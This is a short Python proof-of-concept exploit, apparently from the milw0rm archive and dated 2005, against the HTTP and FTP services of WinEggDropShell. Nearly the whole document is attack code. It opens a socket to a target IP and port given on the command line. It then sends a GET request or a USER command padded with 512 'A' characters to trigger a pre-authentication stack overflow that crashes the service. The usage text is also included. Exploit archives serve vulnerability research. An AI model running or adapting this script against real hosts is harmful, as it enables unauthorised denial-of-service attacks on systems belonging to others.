# WinEggDropShell Multipe PreAuth Remote Stack Overflow PoC
# HTTP Server "GET"  && FTP Server "USER" "PASS" command
# Bug Discoverd and coded by Sowhat
# Greetingz to killer,baozi,Darkeagle,all 0x557 and XFocus guys....;)
# http://secway.org
# 2005-10-11

# Affected:
# WinEggDropShell Eterntiy version
# Other version may be vulnerable toooooo

import sys
import string
import socket

if (len(sys.argv) != 4):
	
	print "##########################################################################"
	print "#      WinEggDropShell Multipe PreAuth Remote Stack Overflow PoC         #"
	print "#          This Poc will BOD the vulnerable target                       #"
	print "#          Bug Discoverd and coded  by Sowhat                            #"
	print "#                 http://secway.org                                      #"
	print "##########################################################################"
	print "\nUsage: " + sys.argv[0] + "HTTP/FTP" + " TargetIP" + " Port\n"
	print "Example: \n" + sys.argv[0] + " HTTP" + " 1.1.1.1" + " 80" 
	print sys.argv[0] + " FTP" + " 1.1.1.1" + " 21" 
	sys.exit(0)

host = sys.argv[2]
port = string.atoi(sys.argv[3])

if ((sys.argv[1] == "FTP") | (sys.argv[1] == "ftp")):

		request = "USER " + 'A'*512 + "\r"

if ((sys.argv[1] == "HTTP") | (sys.argv[1] == "http")):

		request = "GET /" + 'A'*512 + " HTTP/1.1 \r\n" 

exp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
exp.connect((host,port))
exp.send(request)

# milw0rm.com [2005-12-02]
